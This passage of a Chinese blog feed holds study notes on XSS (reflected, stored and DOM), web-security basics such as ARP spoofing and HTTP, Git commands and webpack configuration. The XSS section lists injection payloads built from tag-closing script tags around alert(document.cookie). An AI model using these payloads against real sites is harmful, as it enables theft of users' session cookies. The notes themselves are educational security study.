onerror=alert(document.cookie)&gt;点击提交GET请求后，利用上述php代码中的htmlspecialchars()方法处理敏感字符后返回，避免XSS攻击。 存储型 XSS存储型XSS又称为持久性XSS，存储型XSS是最危险的一种跨站脚本。 允许用户存储数据的Web应用程序都可能出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，此为存储型XSS。 存储型XSS与反射型XSS、DOM型XSS相比，有更高的隐蔽性，危害更大。反射型XSS、DOM型XSS都依赖用户手动去触发，而存储型XSS不需要。 一个常见的存储型XSS场景实例当测试是否存在存储型XSS时，首先确定输入点与输出点。如在留言板测试存储型XSS漏洞，首先要找出留言内容输出(显示)的地方在标签内还是标签属性内，或者其他地方。 若输出数据在标签属性内，则XSS代码不会被执行，如&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot; /&gt;,因为value属性中的XSS代码被当作值处理，无法当作脚本执行，最终浏览器解析HTML时，将会把数据以文本的形式输出在网页中。 确定输出点后，可以根据相应的标签构造HTML代码来闭合，如插入XSS代码&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;，最终在HTML文档中变为：&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot; /&gt;，通过闭合input标签，使输出的内容不在value属性，造成XSS跨站攻击。 具体的存储型XSS漏洞测试如下： 添加正常的留言，查找到显示标签。 若显示区域不在HTML属性内，可以直接使用XSS代码注入。若不确定内容输出的具体位置，可以使用模糊测试方案，XSS代码如下： 123&lt;script&gt;alert(document.cookie)&lt;/script&gt; 普通注入"/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 闭合标签注入&lt;/textarea&gt;'"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 闭合标签注入 在插入盗取cookie的JavaScript代码后，攻击者将该含XSS代码的留言提交，若后端不加处理直接保存到数据库，当用户再次查看这段留言时，浏览器会把XSS代码认为是正常JS代码执行，盗取浏览该留言的用户cookie。 参考博客通过DVWA学习存储型XSS漏洞。 DOM型 XSS基于DOM型的XSS不需要与服务器端交互，只发生在客户端处理数据阶段。123456&lt;script&gt; var temp = document.URL; //获取URL var index= document.URL.indexOf("content=") + 8; var par = temp.substring(index); document.write(decodeURI(par)); //获取输入内容&lt;/script&gt; 上述代码的意思是获取URL中的content参数的值，并且输出，若输入http://www.secbug.org/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;，就会产生XSS漏洞。]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[（一）Web安全深度剖析学习【基础+HTTP】]]></title>
    <url>%2F2018%2F05%2F16%2FWeb%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[《Web安全深度剖析》学习总结, 本部分主要包括WEB安全的基础知识和HTTP协议相关。 Web安全简介Web服务默认运行在服务器的80端口之上(http服务器)，https服务器默认443端口。 服务器风险点如下图：直接对目标攻击的三种手段： C段渗透： 攻击者通过渗透同一网段内的一台主机，对目标主机进行ARP等手段的渗透。 ARP攻击： ARP（地址解析协议）位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。ARP攻击仅能在以太网（局域网如：机房、内网、公司网络等）进行，无法对外网（互联网、非本区域内的局域网）进行攻击。 ARP攻击原理： ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。 攻击者向电脑A发送一个伪造的ARP响应，告诉电脑A：电脑B的IP地址192.168.0.2对应的MAC地址是00-aa-00-62-c6-03，电脑A信以为真，将这个对应关系写入自己的ARP缓存表中，以后发送数据时，将本应该发往电脑B的数据发送给了攻击者。同样的，攻击者向电脑B也发送一个伪造的ARP响应，告诉电脑B：电脑A的IP地址192.168.0.1对应的MAC地址是00-aa-00-62-c6-03，电脑B也会将数据发送给攻击者。至此攻击者就控制了电脑A和电脑B之间的流量，他可以选择被动地监测流量，获取密码和其他涉密信息，也可以伪造数据，改变电脑A和电脑B之间的通信内容。 为了解决ARP攻击问题，可以在网络中的交换机上配置802.1x协议。IEEE 802.1x是基于端口的访问控制协议，它对连接到交换机的用户进行认证和授权。在交换机上配置802.1x协议后，攻击者在连接交换机时需要进行身份认证（结合MAC、端口、帐户、VLAN和密码等），只有通过认证后才能向网络发送数据。攻击者未通过认证就不能向网络发送伪造的ARP报文。 社会工程学：渗透服务器有时不只靠技术，即”攻城为下，攻心为上”，果然社会！！！ Services: 很多传统攻击方式直接针对服务进行溢出。Web作为服务之一，有多种渗透方式。 缓冲区溢出攻击： 缓冲区溢出是指当计算机向缓冲区内填充数据位数时超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。理想的情况是：程序会检查数据长度，而且并不允许输入超过缓冲区长度的字符。但是绝大多数程序都会假设数据长度总是与所分配的储存空间相匹配，这就为缓冲区溢出埋下隐患。操作系统所使用的缓冲区，又被称为“堆栈”，在各个操作进程之间，指令会被临时储存在“堆栈”当中，“堆栈”也会出现缓冲区溢出。 缓冲区溢出攻击利用了缓冲区溢出的漏洞，通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，使程序转而执行其它指令，以达到攻击的目的。利用缓冲区溢出攻击，可以导致程序运行失败、系统关机、重新启动等后果。 HTTP协议URL(统一资源定位符)，格式: 协议://服务器IP[:端口]/路径/[?查询] Linux系统下， curl http网址 命令可以发起http请求，会返回页面的HTML数据。添加-I参数，即 curl http网址 -I 返回http响应头。 HTTP协议经历了三个版本： HTTP/0.9: 只接受GET一种请求方法，没有在通讯中指定版本号，且不支持请求头。由于该版本不支持POST方法，因此客户端无法向服务器传递太多信息。 HTTP/1.0: 第一个在通讯中指定版本号的HTTP协议版本，至今仍被广泛采用，特别是在代理服务器中。相对于HTTP 0.9 ,增加了POST和HEAD命令，增加了头信息，支持长连接（但默认还是使用短连接），缓存机制，以及身份认证，响应对象不只限于HTML，增加了状态码等。 HTTP/1.1: 目前主流的HTTP协议版本,使用最广泛。相对于HTTP 1.0，默认采用长连接，支持以管道方式在同时发送多个请求，以便降低线路负载，提高传输速度，请求与响应支持Host头域，Content-Length字段，分块传输编码，增加了PUT、DELETE等方法。 HTTP/2： 下一代HTTP协议，目前应用还比较少。特点，二进制协议、多路复用、数据流、头部压缩、随时复位、Server Push、优先权和依赖。 HTTP协议详解以HTTP/1.1为例，描述HTTP请求与响应如下。 HTTP请求： 包括请求行(请求方法)、请求头(消息报头)、请求正文(请求体)。HTTP请求的第一行为请求行，由三部分组成，POST表示请求方法，/login.php表示请求路径(该域名根目录下的login.php)，HTTP/1.1表示HTTP版本。 第二行至空白行为HTTP请求头，HOST表示请求的主机地址，User-Agent表示浏览器标识。请求头由客户端自行设定。Google访问http://shirley5li.me/IFE-2018-CSS/animate.css_log/index.html的HTTP GET请求行和请求头如下：12345678910GET /IFE-2018-CSS/animate.css_log/index.html HTTP/1.1Host: shirley5li.meConnection: keep-aliveUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36Upgrade-Insecure-Requests: 1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: _ga=GA1.2.2018838122.1520044936; _gid=GA1.2.1506554401.1526462676; Hm_lvt_06185a244e6f872c8aeab11a4e7b5db4=1526478354; Hm_lpvt_06185a244e6f872c8aeab11a4e7b5db4=1526528658If-Modified-Since: Sun, 06 May 2018 03:32:14 GMT 空白行之后为请求正文(请求体)，请求正文是可选的，通常出现在POST方法中，GET方法不含请求体。 HTTP响应： 包括响应行、响应头(消息报头)、响应正文(响应体)。Google访问http://shirley5li.me/IFE-2018-CSS/animate.css_log/index.html的HTTP 响应行和响应头如下：123456789101112131415161718192021HTTP/1.1 200 OKServer: GitHub.comContent-Type: text/html; charset=utf-8Last-Modified: Sun, 06 May 2018 03:32:14 GMTAccess-Control-Allow-Origin: *Expires: Thu, 17 May 2018 05:20:22 GMTCache-Control: max-age=600Content-Encoding: gzipX-GitHub-Request-Id: FEEA:43E7:353D5D:46B7F2:5AFD0EBDContent-Length: 629Accept-Ranges: bytesDate: Thu, 17 May 2018 05:20:41 GMTVia: 1.1 varnishAge: 0Connection: keep-aliveX-Served-By: cache-hkg17927-HKGX-Cache: MISSX-Cache-Hits: 0X-Timer: S1526534441.070496,VS0,VE229Vary: Accept-EncodingX-Fastly-Request-ID: da54366ec4de37d5adfc39dede5b758996befa2c HTTP请求方法 GETGET方法用于获取请求页面的指定信息(以实体的格式)，如果请求资源为动态脚本(非HTML)，则返回文本是Web容器解析后的HTML源代码，而不是源文件。如请求index.jsp，返回的不是index.jsp的源文件，而是经过解析后的HTML代码。GET方法可以通过查询参数携带数据传递给服务器端，但发送的数据会显示在浏览器，并且有长度限制。 HEAD该方法除了服务器不返回响应体外，其他与GET相同。通常用来测试超链接的有效性、可访问性、最近的改变，攻击者编写扫描工具时通常用此方法，只测试资源是否存在，不返回消息主体，速度最快。 POSTPOST与GET类似，区别是，GET没有请求体，POST包含请求体。POST多用于向服务器发送大量数据，安全性也较高一点。如上传文件、提交留言等。 PUT请求服务器将请求中的实体存储在请求资源下。通常服务器会关闭PUT方法，因为会在服务器建立文件，属于危险方法之一。 DELETE请求服务器删除请求的指定资源。通常服务器会关闭DELETE方法，属于危险方法之一。 TRACE允许客户端查看服务器端接收消息的情况，回显服务器收到的请求，此方法很少见。 CONNECT为了能动态切换到隧道代理。【HTTP隧道：】是HTTP/1.1中引入的功能，主要为了解决明文的HTTP代理无法代理跑在TLS中的流量(https)的问题，同时提供了作为任意流量的TCP通道的能力。什么是HTTP隧道，怎么理解HTTP隧道。HTTP隧道技术可以理解为把所有要传送的数据全部封装到HTTP协议里进行传送。客户端与服务器之间的中间层：代理，网关，或者隧道。 OPTIONS用于请求由URI标识的资源在通信过程中可以使用的功能选项。 HTTP状态码 1XX: 信息提示，表示请求已被成功接收，继续处理。100~101 2XX：成功，服务器成功处理了请求。200~206 3XX: 重定向。300~305 4XX: 客户端错误，客户端发送一些服务器无法处理的信息，例如格式错误的请求、请求一个不存在的URL。400~415 5XX: 服务器错误。500~505 HTTP与HTTPS的区别HTTPS在HTTP之下加入SSL层，可以保护数据的隐私性和完整性。 HTTP传输的是明文，HTTPS则是具有安全性的SSL加密传输协议 HTTP 80端口，HTTPS 443端口 HTTPS需要申请CA证书]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git操作流程总结]]></title>
    <url>%2F2018%2F05%2F16%2Fgit-reset%2F</url>
    <content type="text"><![CDATA[来自Git的4个阶段的撤销更改、Git远程操作详解等博客的学习总结(PS:备份)。 Git的基本概念在创建Git仓库的时候，工作区会有一个隐藏目录.git（Git的版本库)，Git会自动创建一个master分支，以及一个指向master分支的指针HEAD。 如上图所示，Git的本地管理主要分为三个区，第一个工作区，第二个暂存区(statge/index)，第三个本地仓库。1.工作区中文件的增删改，通过git add &lt;file&gt;将改动文件添加到暂存区 2.通过git commit -m &quot;descriptions&quot;将暂存区的多次改动提交到本地仓库 3.通过git push将本地仓库推送到远程仓库。 Git分支管理每个人在各自的分支上开发，互相不影响，最后由管理员或者自己来合并分支，处理冲突，测试上线。 以下流程包括查看分支、新建并切换到dev分支、在dev分支修改文件后合并到master分支，最后删除dev分支的过程。 下面的例子演示了从github clone一个test仓库到本地，并创建新分支dev，在新分支dev上修改文件，合并到主分支master，最后删除dev分支。（注意： 执行git clone命令是将远程仓库更新到本地仓库区，而不是本地工作区！） 查看分支123Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/test (master)$ git branch* master * master表示当前分支为master。新建并切换分支123Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/test (master)$ git checkout -b devSwitched to a new branch 'dev' 1234Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/test (dev)$ git branch* dev master 使用git branch查看分支，共有两个分支，当前分支为dev。 接下来在test文件夹下新建read.txt，并执行git add readme.txt和git commit -m &quot;添加文件测试&quot;将变化从工作区提交到本地仓库区：12Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/test (dev)$ git add read.txt 12345Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/test (dev)$ git commit -m "添加文件测试"[dev b150277] 添加文件测试 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 read.txt 合并分支首先从dev分支切换回master分支1234Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/test (dev)$ git checkout masterSwitched to branch 'master'Your branch is up-to-date with 'origin/master'. 再执行合并dev分支1234567Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/test (master)$ git merge devUpdating d521d20..b150277Fast-forward read.txt | 0 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 read.txt 最后删除dev分支123Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/test (master)$ git branch -d devDeleted branch dev (was b150277). 123Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/test (master)$ git branch* master Git常用指令git --help中常见的git操作指令如下：123456789101112131415161718192021222324252627282930start a working area (see also: git help tutorial) clone Clone a repository into a new directory init Create an empty Git repository or reinitialize an existing onework on the current change (see also: git help everyday) add Add file contents to the index mv Move or rename a file, a directory, or a symlink reset Reset current HEAD to the specified state rm Remove files from the working tree and from the indexexamine the history and state (see also: git help revisions) bisect Use binary search to find the commit that introduced a bug grep Print lines matching a pattern log Show commit logs show Show various types of objects status Show the working tree statusgrow, mark and tweak your common history branch List, create, or delete branches checkout Switch branches or restore working tree files commit Record changes to the repository diff Show changes between commits, commit and working tree, etc merge Join two or more development histories together rebase Reapply commits on top of another base tip tag Create, list, delete or verify a tag object signed with GPGcollaborate (see also: git help workflows) fetch Download objects and refs from another repository pull Fetch from and integrate with another repository or a local branch push Update remote refs along with associated objects git branch 默认查看本地分支git branch -a 查看所有的分支git branch -r 查看远程分支 123456789101112131415161718Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/test (test)$ git branch master* testShirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/test (test)$ git branch -a master* test remotes/origin/HEAD -&gt; origin/master remotes/origin/masterShirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/test (test)$ git branch -r origin/HEAD -&gt; origin/master origin/master Git远程操作 git clonegit clone &lt;版本库的网址&gt; &lt;本地目录名&gt; 从远程主机克隆一个版本库，若不带第二个参数，会在本地主机生成一个与远程主机版本库同名的版本库。eg, 克隆github仓库test到本机，并命名为testLocal:12Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop$ git clone https://github.com/shirley5li/test testLocal git remoteGit要求每个远程主机都必须指定一个主机名。git remote命令就用于管理主机名。 不带参数时，git remote命令查看所有远程主机名: 123Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/testLocal (master)$ git remoteorigin 带-v参数，可以查看所有远程主机名对应的网址： 1234Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/testLocal (master)$ git remote -vorigin https://github.com/shirley5li/test (fetch)origin https://github.com/shirley5li/test (push) 注意： 克隆版本库的时候，所使用的远程主机名自动被Git命名为origin，如果想用其他的主机名，需要用git clone命令的-o参数指定。例如，克隆时指定远程主机名为Test，可以使用 git clone -o Test https://github.com/shirley5li/test。 git remote show &lt;主机名&gt;，查看主机详细信息。 git remote add &lt;主机名&gt; &lt;网址&gt;，用于添加远程主机。 git remote rm &lt;主机名&gt;，删除远程主机。 git remote rename &lt;原主机名&gt; &lt;新主机名&gt;，更改远程主机的名字。 git fetch 用法： git fetch &lt;远程主机名&gt; &lt;分支名&gt; 用于将远程主机版本库的更新取回到本地，但不会对本地的开发代码产生影响，当不指定&lt;分支名&gt;时，默认取回所有分支的更新。(若要作用到本地代码，还需要配合使用git merge) 注意： 所取回的更新，在本地主机上要用”远程主机名/分支名”的形式读取。比如origin主机的master，就要用origin/master读取。查看远程分支(-a表示查看所有分支)：123456$ git branch -rorigin/master$ git branch -a* master remotes/origin/master 取回远程主机的更新以后，可以在它的基础上，使用git checkout命令创建一个新的分支： 1git checkout -b newBranch origin/master 使用git merge或git rebase命令，在本地分支上合并远程分支。以下表示在当前分支上，合并origin/master： 12$ git merge origin/master$ git rebase origin/master git pull 用法： git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt; 用于取回远程主机某个分支的更新，再与本地的指定分支合并，如果远程分支是与当前分支合并，则冒号后面的部分可以省略。 例如，取回远程origin/next分支，再与当前分支合并，等同于先git fetch，再git merge：1234$ git pull origin next# 等同于$ git fetch origin$ git merge origin/next 若当前分支与远程分支存在tracking关系，git pull可以省略远程分支名。 在某些场合，Git会自动在本地分支与远程分支之间，建立一种追踪关系（tracking）。比如，在git clone的时候，所有本地分支默认与远程主机的同名分支，建立追踪关系，即本地的master分支自动tracking origin/master分支。 Git也允许手动建立追踪关系，如下指定本地master分支tracking origin/next分支：1git branch --set-upstream master origin/next 此时，git pull可以省略远程分支名：1$ git pull origin 若当前分支只有一个tracking分支，还可以省略远程主机名： 1$ git pull 上面命令表示，当前分支自动与唯一一个tracking分支进行合并。 采用--rebase模式: git pull --rebase &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;【git merge 和 git rebase 小结】 加上参数 -p 如果远程主机删除了某个分支，默认情况下，git pull不会在拉取远程分支的时候，删除对应的本地分支。这是为了防止，由于其他人操作了远程主机，导致git pull不知不觉删除了本地分支，通过添加参数-p可以在本地删除远程已经删除的分支。1234$ git pull -p# 等同于下面的命令$ git fetch --prune origin $ git fetch -p git push 用法： git push &lt;远程主机名&gt; &lt;本地分支&gt;:&lt;远程分支&gt; 用于将本地分支的更新，推送到远程主机。 省略远程分支名 如果省略远程分支名，则表示将本地分支推送到与之存在tracking关系的远程分支（通常两者同名），如果该远程分支不存在，则会被新建，例如git push origin master表示将本地的master分支推送到origin主机的master分支，如果后者不存在，则会被新建。 省略本地分支名 表示删除指定的远程分支，等同于推送一个空的本地分支到远程分支，以下命令表示删除origin主机的master分支：123$ git push origin :master# 等同于$ git push origin --delete master 省略本地分支和远程分支 如果当前分支与远程分支之间存在tracking系，则本地分支和远程分支都可以省略: git push origin。 省略远程主机名 如果当前分支只有一个追踪分支，那么主机名也可以省略： git push。 Git的4个阶段的撤销更改 该部分内容假设只有一个主分支master。 4个区 工作区(Working Area) 暂存区(Stage) 本地仓库(Local Repository) 远程仓库(Remote Repository) 5种状态以上4个区，进入每一个区成功之后会产生一个状态，再加上最初始的一个状态，一共是5种状态。 未修改(Origin) 已修改(Modified) 已暂存(Staged) 已提交(Committed) 已推送(Pushed) 检查修改已修改，未暂存1git diff git diff这个命令只检查工作区和暂存区之间的差异。 已暂存，未提交1git diff --cached git diff --cached用于检查暂存区到本地仓库之间的差异。 已提交，未推送1git diff master origin/master 这里，master表示的本地仓库分支，而origin/master表示远程仓库分支。以上命令用于检查本地仓库与远程仓库之间的差异。 撤销修改已修改，未暂存1git checkout . 或者1git reset --hard 做完修改之后，如果你想向前走一步，让修改进入暂存区，就执行git add .，如果你想向后退一步，撤销刚才的修改，就执行git checkout .。 已暂存，未提交12git resetgit checkout . 或者1git reset --hard git reset只是把修改退回到了git add .之前的状态，即文件本身还处于已修改未暂存状态，你如果想退回未修改状态，还需要执行git checkout .。 已提交，未推送1git reset --hard origin/master 此刻的状态已经污染了本地仓库，需要从远程仓库把代码取回来。 已推送12git reset --hard HEAD^git push -f 此刻已经污染了远程仓库，需要先恢复本地仓库，再强制push到远程仓库。]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[(二)Webpack相关概念总结]]></title>
    <url>%2F2018%2F05%2F14%2Fwebpack-concepts-study%2F</url>
    <content type="text"><![CDATA[关于webapck相关概念的学习总结。 概念webpack 是一个现代 JavaScript 应用程序的静态模块打包器(module bundler)。当 webpack 处理应用程序时，它会递归地构建一个依赖关系图(dependency graph)，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle。 从 webpack v4.0.0 开始，可以不用引入配置文件，而webpack 仍然还是高度可配置的，通过在项目根目录下创建一个webpack.config.js文件用来配置webpack，在(一)webpack入门总结中已描述。 入口(entry)入口起点(entry point) 指示 webpack 应该使用哪个模块，来作为构建其内部依赖图的开始。进入入口起点后，webpack 会找出有哪些模块和库是入口起点（直接和间接）依赖的。eg: (一)webpack入门总结中src/index.js即为入口起点，如下： webpack.config.js123456789const path = require('path');module.exports = &#123; entry: './src/index.js', //入口 output: &#123; //出口 filename: 'main.js', path: path.resolve(__dirname, 'dist') &#125;&#125;; 注意： path模块为node.js的核心模块，用来操作文件路径。 出口(output)output 属性指示 webpack 在哪里输出它所创建的 bundles，以及如何命名这些文件，默认输出在 ./dist文件夹下。如上的webpack.config.js配置中的output字段即为配置出口，通过 output.filename 和 output.path 属性，指示生成的 bundle 名称，以及 bundle 生成(emit)到哪个目录下，示例中生成的bundle名称为mian.js，生成到根目录下的dist文件夹下。 loaderloader 让 webpack 能够去处理那些非 JavaScript 文件（webpack 自身只理解 JavaScript）。loader 可以将所有类型的文件转换为 webpack 能够处理的有效模块，然后就可以利用 webpack 的打包能力，对它们进行处理。 webpack loader 将所有类型的文件，转换为应用程序的依赖图（和最终的 bundle）可以直接引用的模块，loader 能够 import 导入任何类型的模块（例如 .css 文件）。 webpack 的配置中 loader 的两个目标： test 属性，用于标识出应该被对应的 loader 进行转换的某个或某些文件。 use 属性，表示进行转换时，应该使用哪个 loader。 webpack.config.js1234567891011121314const path = require('path');const config = &#123; output: &#123; filename: 'my-first-webpack.bundle.js' &#125;, module: &#123; rules: [ //定义loader &#123; test: /\.txt$/, use: 'raw-loader' &#125; ] &#125;&#125;;module.exports = config; 以上配置中，对一个单独的 module 对象定义了 rules 属性，里面包含两个必须属性：test 和 use，相当于告诉webpack编译器在进行require()或import时如果遇到.txt文件路径，先使用raw-loader处理后再进行打包。 注意： 在 webpack 配置中定义 loader 时，要定义在 module.rules 中，而不是 rules。 插件(plugins)loader 被用于转换某些类型的模块，而插件则可以用于执行范围更广的任务。插件的范围包括，从打包优化和压缩，一直到重新定义环境中的变量。 如何使用一个插件：在webpack.config.js配置文件中先require()该插件，然后将其添加到plugins数组中。以在一个配置文件中因为不同目的而多次使用同一个插件，这时需要通过使用 new 操作符来创建它的一个实例。 webpack.config.js12345678910111213141516const HtmlWebpackPlugin = require('html-webpack-plugin'); // 通过 npm 安装const webpack = require('webpack'); // 用于访问内置插件const config = &#123; module: &#123; rules: [ &#123; test: /\.txt$/, use: 'raw-loader' &#125; ] &#125;, plugins: [ new webpack.optimize.UglifyJsPlugin(), new HtmlWebpackPlugin(&#123;template: './src/index.html'&#125;) ]&#125;;module.exports = config; 模式(mode)通过选择 development(开发环境) 或 production(生产环境) 之中的一个，来设置 mode 参数，启用相应模式下的 webpack 内置的优化。 webpack.config.js123module.exports = &#123; mode: 'production'&#125;; 入口起点(Entry Points)下面介绍如何配置entry属性。 单个入口（简写）语法方法：entry: string|Array&lt;string&gt; webpack.config.js12345const config = &#123; entry: './src/index.js'&#125;;module.exports = config; entry 属性的单个入口语法，是下面形式的简写：12345const config = &#123; entry: &#123; main: './src/index.js' &#125;&#125;; 向 entry 属性传入「文件路径(file path)数组」将创建“多个主入口(multi-main entry)”。在想要多个依赖文件一起注入，并且将它们的依赖导向(graph)到一个“chunk”时，传入数组的方式就很有用。 对象语法用法：entry: {[entryChunkName: string]: string|Array&lt;string&gt;} webpack.config.js123456const config = &#123; entry: &#123; app: './src/app.js', vendors: './src/vendors.js' &#125;&#125;; 对象语法比较繁琐，但这是应用程序中定义入口的最可扩展的方式。 “可扩展的 webpack 配置”： 是指可重用并且可以与其他配置组合使用。这是一种流行的技术，用于将关注点(concern)从环境(environment)、构建目标(build target)、运行时(runtime)中分离，然后使用专门的工具（如 webpack-merge）将它们合并。 以上webpack.config.js配置中，entry属性作为分离应用程序(app) 和 第三方库(vendor)入口， webpack 从 app.js 和 vendors.js 开始创建依赖图，这些依赖图是彼此完全分离、互相独立的(每个 bundle 中都有一个 webpack 引导)，该种方式比较常见于，只有一个入口起点（不包括 vendor）的 单页应用程序 中。 why？ 此设置允许使用 CommonsChunkPlugin 从「应用程序 bundle」中提取 vendor 引用到 vendor bundle，并把引用 vendor 的部分替换为 __webpack_require__() 调用，如果应用程序 bundle 中没有 vendor 代码，那么可以在 webpack 中实现被称为长效缓存的通用模式。（不是很懂这个地方？？？） 多页面应用程序webpack.config.js1234567const config = &#123; entry: &#123; pageOne: './src/pageOne/index.js', pageTwo: './src/pageTwo/index.js', pageThree: './src/pageThree/index.js' &#125;&#125;; 改配置指示webpack 需要 3 个独立分离的依赖图。 在多页应用中，每当页面跳转时服务器将为获取一个新的 HTML 文档，页面重新加载新文档，并且资源被重新下载。然而，这给了我们特殊的机会去做很多事： 使用 CommonsChunkPlugin 为每个页面间的应用程序共享代码创建 bundle。由于入口起点增多，多页应用能够复用入口起点之间的大量代码/模块，从而可以极大地从这些技术中受益。 注意： 每个 HTML 文档只使用一个入口起点。 输出(Output)配置 output 属性可以控制 webpack 如何向硬盘写入编译文件。注意： 即使可以存在多个入口起点，但只指定一个输出配置。 用法配置 output 属性的最低要求是，将它的值设置为一个对象，包括以下两点： filename 用于输出文件的文件名。 目标输出目录 path 的 绝对路径 。 webpack.config.js12345678const config = &#123; output: &#123; filename: 'bundle.js', path: '/home/proj/public/assets' &#125;&#125;;module.exports = config; 多个入口起点如果配置创建了多个单独的 “chunk”（例如，使用多个入口起点或使用 CommonsChunkPlugin 这样的插件），则应该使用占位符来确保每个文件具有唯一的名称。 123456789101112&#123; entry: &#123; app: './src/app.js', search: './src/search.js' &#125;, output: &#123; filename: '[name].js', path: __dirname + '/dist' &#125;&#125;// 写入到硬盘：./dist/app.js, ./dist/search.js 高级功能以下是使用 CDN 和资源 hash 的复杂示例： webpack.config.js1234output: &#123; path: "/home/proj/cdn/assets/[hash]", publicPath: "http://cdn.example.com/assets/[hash]/"&#125; 在编译时不知道最终输出文件的 publicPath 的情况下，publicPath 可以留空，并且在入口起点文件运行时动态设置,在入口起点设置 __webpack_public_path__，如下： 123__webpack_public_path__ = myRuntimePublicPath// 剩余的应用程序入口 模式(Mode)mode 配置选项，指示 webpack 使用相应模式的内置优化。 用法(1) 在配置文件中提供mode属性： 123module.exports = &#123; mode: 'production'&#125;; (2) 从 CLI 参数中传递: webpack --mode=production 支持以下字符串值：注意： 只设置 NODE_ENV，则不会自动设置 mode。 mode:development12345678// webpack.development.config.jsmodule.exports = &#123;+ mode: 'development'- plugins: [- new webpack.NamedModulesPlugin(),- new webpack.DefinePlugin(&#123; "process.env.NODE_ENV": JSON.stringify("development") &#125;),- ]&#125; mode:production12345678910// webpack.production.config.jsmodule.exports = &#123;+ mode: 'production',- plugins: [- new UglifyJsPlugin(/* ... */),- new webpack.DefinePlugin(&#123; "process.env.NODE_ENV": JSON.stringify("production") &#125;),- new webpack.optimize.ModuleConcatenationPlugin(),- new webpack.NoEmitOnErrorsPlugin()- ]&#125; loaderloader 用于对模块的源代码进行转换。loader 可以使你在 import 或”加载”模块时预处理文件。loader 可以将文件从不同的语言（如 TypeScript）转换为 JavaScript，或将内联图像转换为 data URL。loader 甚至允许你直接在 JavaScript 模块中 import CSS文件。 示例可以使用 loader 告诉 webpack 加载 CSS 文件，或者将 TypeScript 转为 JavaScript。为此，首先安装相对应的 loader：12npm install --save-dev css-loadernpm install --save-dev ts-loader 然后指示 webpack 对每个 .css 使用 css-loader，对每个 .ts 文件使用 ts-loader。 webpack.config.js12345678module.exports = &#123; module: &#123; rules: [ &#123; test: /\.css$/, use: 'css-loader' &#125;, &#123; test: /\.ts$/, use: 'ts-loader' &#125; ] &#125;&#125;; 使用 loader有三种使用 loader 的方式： 配置（推荐）：在 webpack.config.js 文件中指定 loader。 内联：在每个 import 语句中显式指定 loader。 CLI：在 shell 命令中指定它们。 配置在webpack.config.js配置文件中，通过module.rules指定多个 loader。 12345678910111213141516module: &#123; rules: [ &#123; test: /\.css$/, use: [ &#123; loader: 'style-loader' &#125;, &#123; loader: 'css-loader', options: &#123; modules: true &#125; &#125; ] &#125; ]&#125; 内联可以在 import 语句或任何等效于 “import” 的方式中指定 loader。使用 ! 将资源中的 loader 分开。分开的每个部分都相对于当前目录解析。1import Styles from 'style-loader!css-loader?modules!./styles.css'; 选项可以传递查询参数，例如 ?key=value&amp;foo=bar，或者一个 JSON 对象，例如 ?{&quot;key&quot;:&quot;value&quot;,&quot;foo&quot;:&quot;bar&quot;}。 注意： 尽可能使用 module.rules，因为这样可以减少源码中的代码量，并且可以在出错时，更快地调试和定位 loader 中的问题。 CLI可以通过 CLI 使用 loader:1webpack --module-bind jade-loader --module-bind 'css=style-loader!css-loader' 以上命令对 .jade 文件使用 jade-loader，对 .css 文件使用 style-loader 和 css-loader。 loader特性 loader 支持链式传递。能够对资源使用流水线(pipeline)，一组链式的 loader 将按照相反的顺序执行。loader 链中的第一个 